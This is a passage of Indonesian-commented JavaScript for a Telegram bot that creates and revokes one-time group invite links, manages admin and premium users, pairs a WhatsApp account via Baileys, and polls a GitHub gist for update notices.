    }
    
    // CEK HARUS DI GROUP
    if (ctx.chat.type === "private") {
        return ctx.reply("❌ Command ini hanya bisa dipakai di dalam group!");
    }
    
    const chatId = ctx.chat.id;
    const chatTitle = ctx.chat.title || "Group";
    const pembuat = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
    
    try {
        // BUAT LINK EXPIRED 1 MENIT + 1 KALI PAKAI
        const expireDate = Math.floor(Date.now() / 1000) + 60;
        
        const invite = await ctx.telegram.createChatInviteLink(chatId, {
            expire_date: expireDate,
            member_limit: 1,
            name: `onetime_${Date.now()}`
        });
        
        const link = invite.invite_link;
        const uniqueId = Date.now().toString();
        
        // SIMPAN LINK KE MEMORY
        activeLinks.set(uniqueId, {
            link: link,
            chatId: chatId,
            createdAt: Date.now(),
            createdBy: ctx.from.id
        });
        
        // KIRIM LINK DENGAN TAMPILAN KEREN + TOMBOL BERWARNA
        await ctx.reply(`
<blockquote><b>╭━━━━━━━━━━━━━━━╮
┃ 🔗 *LINK TEMPORARY*
╰━━━━━━━━━━━━━━━╯

📛 *Group:* ${chatTitle}
👤 *Dibuat oleh:* ${pembuat}
⏱️ *Expired:* 1 menit
👥 *Limit:* 1 orang (sekali pakai)

\`${link}\`

⚠️ *Link akan MATI TOTAL jika:*
├ ① Sudah dipakai 1x
├ ② Melewati 1 menit
╰ ③ Dibatalkan oleh admin

📌 *Klik tombol di bawah untuk menyalin link*</b></blockquote>
        `, {
            parse_mode: "HTML",
reply_markup: {
    inline_keyboard: [
        [
            { text: "📋 SALIN LINK", callback_data: `copy_${link}`, style: "Success" },
            { text: "❌ BATALKAN LINK", callback_data: `batal_${uniqueId}`, style: "Danger" }
        ]
    ]
}
            
        });
        
        // REVOKE OTOMATIS SETELAH 65 DETIK
        setTimeout(async () => {
            try {
                await ctx.telegram.revokeChatInviteLink(chatId, link);
                activeLinks.delete(uniqueId);
            } catch(e) {}
        }, 65000);
        
    } catch (error) {
        ctx.reply(`❌ Gagal buat link: ${error.message}\n\nPastikan bot adalah admin!`);
    }
});


// HANDLE BATALKAN LINK (FIX)
bot.action(/batal_(.+)/, async (ctx) => {
    const userId = ctx.from.id;
    const uniqueId = ctx.match[1];
    
    // CEK APAKAH ADMIN ATAU YANG BUAT LINK
    const linkData = activeLinks.get(uniqueId);
    
    if (!linkData) {
        return ctx.answerCbQuery("❌ Link sudah tidak aktif atau sudah expired!", { show_alert: true });
    }
    
    // CEK HAK AKSES (OWNER, ADMIN, ATAU YANG BUAT LINK)
    const isOwner = userId == ownerID;
    const isAdmin = isAdminUser(userId);
    const isCreator = linkData.createdBy === userId;
    
    if (!isOwner && !isAdmin && !isCreator) {
        return ctx.answerCbQuery("❌ Bukan admin atau pembuat link!", { show_alert: true });
    }
    
    try {
        // REVOKE LINK
        await ctx.telegram.revokeChatInviteLink(linkData.chatId, linkData.link);
        
        // HAPUS DARI MEMORY
        activeLinks.delete(uniqueId);
        
        // KASIH TAU BERHASIL
        await ctx.answerCbQuery("✅ Link berhasil dibatalkan!", { show_alert: true });
        
        // EDIT PESAN HAPUS TOMBOL
        try {
            await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
            await ctx.editMessageCaption(`
❌ *LINK TELAH DIBATALKAN*

Link temporary sudah tidak aktif.
            `, { parse_mode: "Markdown" });
        } catch(e) {}
        
    } catch (error) {
        await ctx.answerCbQuery(`❌ Gagal batalkan: ${error.message}`, { show_alert: true });
    }
});

// VERSI SIMPEL TANPA STORAGE (LANGSUNG REVOKE SEMUA)
bot.command('batalink', async (ctx) => {
    if (ctx.from.id != ownerID && !isAdminUser(ctx.from.id)) {
        return ctx.reply("❌ Akses hanya untuk owner/admin!");
    }
    
    if (ctx.chat.type === "private") {
        return ctx.reply("❌ Command ini hanya bisa dipakai di dalam group!");
    }
    
    const chatId = ctx.chat.id;
    const processMsg = await ctx.reply("⏳ Membatalkan semua link temporary...");
    
    try {
        const links = await ctx.telegram.getChatInviteLinks(chatId);
        let revoked = 0;
        
        for (const link of links) {
            // HAPUS LINK YANG NAMANYA "onetime_" ATAU TEMPORARY
            if (link.name && (link.name.startsWith('onetime_') || link.name.includes('temp'))) {
                try {
                    await ctx.telegram.revokeChatInviteLink(chatId, link.invite_link);
                    revoked++;
                } catch(e) {}
            }
        }
        
        // BERSIHKAN STORAGE
        for (const [id, data] of activeLinks.entries()) {
            if (data.chatId == chatId) {
                activeLinks.delete(id);
            }
        }
        
        await ctx.deleteMessage(processMsg.message_id);
        
        if (revoked > 0) {
            ctx.reply(`✅ Berhasil membatalkan ${revoked} link temporary!\n\nSemua link 1x pakai sudah tidak aktif.`);
        } else {
            ctx.reply(`ℹ️ Tidak ada link temporary yang aktif di group ini.`);
        }
        
    } catch (error) {
        await ctx.editMessageText(`❌ Gagal: ${error.message}`);
    }
});

let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'
const GROUP_DB_PATH = path.join(__dirname, "../database/group.json");

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 0
    } catch {
        return 0
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.red(`⠀⠀⠀⠀⠀⢠⠖⠀⡜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢱⡀⠈⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⡟⠀⣸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⡀⠸⣆⠀⠀⠀⠀
⠀⠀⠀⢠⡿⠀⢰⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠀⢹⣇⠀⠀⠀
⠀⠀⠀⣸⡇⠀⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⡄⠀⣿⡀⠀⠀
⠀⠀⢠⣿⠀⢸⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣧⠀⢹⡇⠀⠀
⠀⠀⣸⣿⠀⠘⢿⠿⠶⢶⣻⢿⣦⣠⣦⢠⣤⣠⡿⢛⡿⠷⠿⢿⠟⠀⢸⣿⡀⠀
⠀⠠⣿⣧⣤⣤⣴⡶⠿⠿⠛⠻⣿⣿⣿⣿⣿⣿⠾⠿⠿⠿⠷⣶⣤⣤⣼⣿⡇⠀
⠀⠀⠈⠛⠛⠉⠀⢀⣴⡿⠛⣻⣿⣿⣿⣿⣿⣿⣟⠛⠻⣷⣄⠀⠀⠉⠛⠏⠀⠀
⠀⠀⠀⠀⠀⣠⣶⠟⢉⣤⣾⡿⣹⣿⣿⣿⣿⣷⠻⢷⣦⡌⠻⣷⣄⡀⠀⠀⠀⠀
⠀⠀⣀⣴⡾⠏⠁⠀⢠⣿⣏⠀⢹⣿⣿⣿⣿⣿⠀⢸⣿⡇⠀⠀⠙⢿⣦⣄⠀⠀
⢸⣿⡟⠉⠀⠀⠀⠀⠰⣿⡗⠀⠈⣿⣿⣿⣿⡏⠀⢸⣿⡇⠀⠀⠀⠀⠈⠹⣿⣿
⢸⣿⡇⠀⠀⠀⠀⠀⢘⣿⡇⠀⠀⢹⣿⣿⣿⠀⠀⠘⣿⡇⠀⠀⠀⠀⠀⠀⣿⡏
⠈⣿⡇⠀⠀⠀⠀⠀⢨⣿⡇⠀⠀⠀⢿⣿⠇⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⣿⡇
⠀⢻⣷⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡇⠀⠀⠀⠀⠀⢸⣿⠃
⠀⠸⣿⠀⠀⠀⠀⠀⠀⢿⡧⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⢸⡏⠀
⠀⠀⢹⡆⠀⠀⠀⠀⠀⢸⡗⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⣿⠁⠀
⠀⠀⠈⢧⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⣸⡇⠀⠀⠀⠀⠀⢸⠇⠀⠀
⠀⠀⠀⠘⠆⠀⠀⠀⠀⠀⢹⡆⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⢀⠎⠀⠀⠀
⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⢷⠀⠀⠀⠀⠀⠀⢰⠃⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢆⠀⠀⠀⠀⢀⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`));


  console.log(chalk.yellow(`
━─━━⪻「 χ-ɖʀєαɖ 」⪼━━─━
┏────────────────────────┓
│╭━( INFORMASI )
┃女 Developer : @RazzxyBack
┃女 Channel : @XdreadTeam
┗────────────────────────┛
`));
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '13.0'],
        getMessage: async (key) => ({
            conversation: 'Always Prime',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote> ⬡═―—⊱ ⎧ χ-ɖʀєαɖ ⎭ ⊰―—═⬡
𖤓 Number: ${lastPairingMessage.phoneNumber}
𖤓 Pairing Code: ${lastPairingMessage.pairingCode}
𖤓 Status: Connected
</blockquote>`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.blue(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⠀⠀⢸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣼⣿⣿⣿⣧⡀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠰⠶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡶⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣿⣿⣿⡿⠋⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡿⠀⢰⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠇⠀⣾⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠈⣿⢀⣼⣿⣿⣿⣿⣿⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠠⣴⣶⣾⣿⣿⣿⣿⣗⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣦⡤
⠀⠀⠀⠀⠀⠀⠀⠈⠉⣿⡟⠿⣿⣿⣿⣿⣿⣿⣿⣯⣿⣿⡿⠟⠋⠉⠉⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣧⠀⠀⠝⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⡄⠀⠀⠘⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣧⠀⠀⠀⢹⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣠⣼⣿⣿⣿⣿⣿⣷⣤⡀⠘⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡧⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠉⠙⠻⢿⣿⣿⣿⣿⣿⣿⠿⠛⠉⢹⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⡿⠃⠀⠀⠀⢸⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠃⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⠀⠀⠀⠀⠀⠈⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`));
console.log(chalk.bold.red(`
⬡═—⊱ χ-ɖʀєαɖ ⊰—═⬡
  ᴏᴡɴᴇʀ : @RazzxyBack
  ᴄʜᴀɴɴᴇʟ : @XdreadTeam
  ᴠᴇʀsɪᴏɴ : 2.6
────────────────────
  MAAF JIKA SCRIPT INI 
  KURANG SEMPURNA ATAU 
  MASIH BANYAK BUG
────────────────────
⧫━⟢ THANKS ⟣━⧫
  `));
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

let adminUsers = new Set([ownerID.toString()]);
function isAdminUser(userId) {
    return adminUsers.has(userId.toString());
}

function checkAdmin(ctx, next) {
    if (!isAdminUser(ctx.from.id)) {
        return ctx.reply("❌ ☇ Akses hanya untuk admin");
    }
    next();
}

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

const checkPremiumOrGroupPremium = (ctx, next) => {
    const userId = ctx.from.id.toString();
    const chatId = ctx.chat.id.toString();
    
    // CEK USER PREMIUM DULU
    if (isPremiumUser(userId)) {
        return next();
    }
    
    // CEK GROUP PREMIUM (JIKA DI GROUP)
    if (ctx.chat.type !== "private" && isGroupPremium(chatId)) {
        return next();
    }
    
    // KALAU GAK PREMIUM SATU PUN
    ctx.reply("❌ ☇ Akses hanya untuk:\n• User Premium\n• Group Premium\n\nHubungi @RazzxyBack untuk upgrade!");
    return;
};

bot.command('addadmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    const replyTarget = ctx.message.reply_to_message;
    
    let userId = '';
    
    if (replyTarget && replyTarget.from) {
        userId = replyTarget.from.id.toString();
    } else if (args.length >= 2) {
        userId = args[1];
    } else {
        return ctx.reply("🪧 ☇ Cara:\n1. Reply pesan target + /addadmin\n2. /addadmin <user_id>");
    }
    
    if (!userId || isNaN(userId)) {
        return ctx.reply("❌ ☇ ID tidak valid");
    }
    
    adminUsers.add(userId);
    
    await ctx.reply(
        `👑 <b>Admin Berhasil Ditambahkan</b>\n• User: <code>${userId}</code>`,
        { parse_mode: "HTML", reply_to_message_id: ctx.message.message_id }
    );
    
    try {
        await ctx.telegram.sendMessage(
            userId,
            `🎖️ <b>Anda sekarang Admin FAULET XBLAUD!</b>\nAkses: Semua command bot kecuali manage admin`,
            { parse_mode: "HTML" }
        );
    } catch (error) {}
});

bot.command('deladmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    const replyTarget = ctx.message.reply_to_message;
    
    let userId = '';
    
    if (replyTarget && replyTarget.from) {
        userId = replyTarget.from.id.toString();
    } else if (args.length >= 2) {
        userId = args[1];
    } else {
        return ctx.reply("🪧 ☇ Cara:\n1. Reply pesan target + /deladmin\n2. /deladmin <user_id>");
    }
    
    if (!userId || isNaN(userId)) {
        return ctx.reply("❌ ☇ ID tidak valid");
    }
    
    if (userId === ownerID.toString()) {
        return ctx.reply("❌ ☇ Tidak bisa hapus owner");
    }
    
    const wasAdmin = adminUsers.delete(userId);
    
    if (wasAdmin) {
        await ctx.reply(`🗑️ <b>Admin Berhasil Dihapus</b>\n• User: <code>${userId}</code>`,
            { parse_mode: "HTML", reply_to_message_id: ctx.message.message_id });
    } else {
        await ctx.reply(`❌ <b>User bukan admin</b>\n• User: <code>${userId}</code>`,
            { parse_mode: "HTML", reply_to_message_id: ctx.message.message_id });
    }
});

// ==================== AUTO INFO DARI GIST ====================
// ==================== AUTO INFO DARI GIST (VERSI KEREN) ====================
const GIST_RAW_URL = "https://gist.githubusercontent.com/razzxyahay/36d4f3c7d4e27a288a56f86e30331041/raw/info.json"; // GANTI URL GIST LU
let lastUpdate = null;

// FUNGSI CEK INFO DARI GIST
async function cekInfoDariGist() {
    try {
        const { data } = await axios.get(GIST_RAW_URL, { 
            timeout: 10000,
            headers: { 'Cache-Control': 'no-cache' }
        });
        
        // KALO BELUM PERNAH CEK, SIMPAN DULU
        if (!lastUpdate) {
            lastUpdate = data;
            return;
        }
        
        // CEK APAKAH ADA PERUBAHAN
        if (JSON.stringify(data) !== JSON.stringify(lastUpdate)) {
            console.log("📢 GIST BERUBAH! MENGIRIM NOTIF...");
            
            // FORMAT LIST UPDATE
            let listUpdate = '';
            if (data.updates && Array.isArray(data.updates)) {
                data.updates.forEach((item, i) => {
                    listUpdate += `├ ${item}\n`;
                });
            } else {
                listUpdate = `├ ${data.pesan || 'Ada update terbaru!'}\n`;
            }
            
            // KIRIM NOTIF KE OWNER
            const notifMessage = `
<blockquote><b>🎉 NEW UPDATE!</b></blockquote>

<blockquote>
┏━━━━━━━━━━━━━━━━━━━━━
${listUpdate}
┗━━━━━━━━━━━━━━━━━━━━━
</blockquote>

<blockquote>
┏━━━━━━━━━━━━━━━━━━━━━
┣ 📌 <b>Versi</b> : ${data.versi || data.version || '2.6.0'}
┣ ⏰ <b>Waktu</b> : ${data.waktu || new Date().toLocaleString('id-ID')}
┗━━━━━━━━━━━━━━━━━━━━━
</blockquote>

<blockquote>
💡 <i>Update otomatis dari developer! Join channel @XdreadTeam untuk info lebih lanjut</i>
</blockquote>

⚡ <b>Segera update bot kalian!</b>
            `;
            
            await bot.telegram.sendMessage(ownerID, notifMessage, {
                parse_mode: "HTML",
                disable_web_page_preview: true
            });
            
            lastUpdate = data;
        }
        
    } catch (error) {
        // DIAM AJA
    }
}

// CEK TIAP 30 DETIK
setInterval(() => {
    cekInfoDariGist();
}, 30000);

// CEK PERTAMA KALI SAAT BOT START
setTimeout(() => {
    cekInfoDariGist();
}, 5000);

bot.command('listadmin', checkAdmin, async (ctx) => {
    let adminList = "👥 <b>Daftar Admin</b>\n\n";
    let counter = 1;
    
    adminUsers.forEach(userId => {
        adminList += `${counter}. <code>${userId}</code> ${userId === ownerID.toString() ? '👑' : '👨‍💼'}\n`;
        counter++;
    });
    
    adminList += `\nTotal: ${adminUsers.size} admin`;
    await ctx.reply(adminList, { parse_mode: "HTML", reply_to_message_id: ctx.message.message_id });
});

function getPremiumUsers() {
    const premiumPath = path.join(__dirname, 'database', 'premium.json');
    
    try {
        if (fs.existsSync(premiumPath)) {
            const data = JSON.parse(fs.readFileSync(premiumPath, 'utf8'));
            
            if (typeof data === 'object' && !Array.isArray(data)) {
                return Object.entries(data).map(([userId, expiryDate]) => ({
                    userId,
                    expiryDate
                }));
            }
            
            else if (Array.isArray(data)) {
                return data;
            }
        } else {
            console.log("File premium.json tidak ditemukan di", premiumPath);
        }
    } catch (error) {
        console.error("Error membaca premium.json:", error);
    }
    return [];
}

bot.command('listprem', checkAdmin, async (ctx) => {
    const premiumUsers = getPremiumUsers();
    
    if (!premiumUsers || premiumUsers.length === 0) {
        return ctx.reply("📭 Tidak ada user premium");
    }
    
    let premList = "🌟 <b>Daftar User Premium</b>\n\n";
    
    premiumUsers.forEach((user, index) => {
        const userId = user.userId || user.id || "N/A";
        const expiry = user.expiryDate || user.expiry || "Unknown";
        
        // Cek apakah expired
        let status = "✅ Active";
        try {
            const expiryDate = new Date(expiry);
            if (new Date() > expiryDate) {
                status = "❌ Expired";
            }
        } catch (e) {}
        
        premList += `${index + 1}. <code>${userId}</code>\n`;
        premList += `   • Berakhir: ${expiry}\n`;
        premList += `   • Status: ${status}\n\n`;
    });
    
    premList += `Total: ${premiumUsers.length} user premium`;
    
    await ctx.reply(premList, { 
        parse_mode: "HTML",
        reply_to_message_id: ctx.message.message_id 
    });
});

bot.command('addprem', async (ctx) => {
    // CEK APAKAH OWNER ATAU ADMIN
    if (ctx.from.id != ownerID && !isAdminUser(ctx.from.id)) {
        return ctx.reply("❌ ☇ Akses hanya untuk owner / admin atau admin");
    }
    
    const args = ctx.message.text.split(" ");
    const replyTarget = ctx.message.reply_to_message;
    
    let userId = '';
    
    if (replyTarget && replyTarget.from) {
        userId = replyTarget.from.id.toString();
    } 
    else if (args.length >= 2) {
        userId = args[1];
    } 
    else {
        return ctx.reply("🪧 ☇ Cara penggunaan:\n1. Reply pesan target dan ketik /addprem\n2. /addprem <user_id>");
    }
    
    if (!userId || isNaN(userId)) {
        return ctx.reply("❌ ☇ ID user tidak valid");
    }
    
    const keyboard = {
        inline_keyboard: [
            [
                { text: "⌜📅⌟ 1 Bulan (30 Hari)", callback_data: `addprem_${userId}_30` }
            ],
            [
                { text: "⌜⚡⌟ Permanen (100 Hari)", callback_data: `addprem_${userId}_100` }
            ]
        ]
    };
    
    await ctx.reply(
        `👑 <b>Tambah Premium</b>\n` +
        `• User: <code>${userId}</code>\n` +
        `• Pilih durasi di bawah:`,
        {
            parse_mode: "HTML",
            reply_to_message_id: ctx.message.message_id,
            reply_markup: keyboard
        }
    );
});

bot.command("addbot", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addbot 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "XDREAD99");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `\`\`\`javascript
⬡═―—⊱ ⎧ χ-ɖʀєαɖ ⎭ ⊰―—═⬡
𖤓 Number: ${phoneNumber}
𖤓 Pairing Code: ${formattedCode}
𖤓 Status: Not Connected
\`\`\``;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "Markdown"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote><b> ⬡═―—⊱ ⎧ χ-ɖʀєαɖ ⎭ ⊰―—═⬡ 
𖤓 Number: ${lastPairingMessage.phoneNumber}
𖤓 Pairing Code: ${lastPairingMessage.pairingCode}
𖤓 Status: Connected
</b></blockquote>`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("setcd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

// ==================== ANTI CULIK ====================
let antiCulik = true;
let autoReject = false;
let pendingGroups = new Map();

// COMMAND ANTICULIK
bot.command("anticulik", (ctx) => {
    if (ctx.from.id != ownerID) return ctx.reply("❌ Khusus owner!");

    const args = ctx.message.text.split(" ")[1];

    if (!args) {
        return ctx.reply(`
<blockquote><b>🛡️ ANTI CULIK PROTECTION</b></blockquote>

<code>/anticulik on</code>        → Aktifkan proteksi
<code>/anticulik off</code>       → Nonaktifkan proteksi  
